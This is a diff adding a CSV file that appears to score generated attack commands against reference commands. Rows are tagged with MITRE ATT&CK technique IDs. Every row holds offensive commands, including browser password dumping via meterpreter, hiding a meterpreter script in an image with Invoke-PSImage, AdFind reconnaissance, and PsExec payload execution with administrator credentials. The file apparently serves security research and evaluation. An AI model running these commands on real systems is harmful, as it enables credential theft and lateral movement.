@@ -1,0 +1,17 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,0.318,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords url \n username \n password,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.356,True
+command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.779,True
+command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\existing_image.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.73,True
+command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.667,True
+command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.293,True
+command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.317,True
+command_psexec_TA0007_T1057.txt,psexec,psexec @C:\path\to\computerlist.txt -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.31,True
+command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.329,True
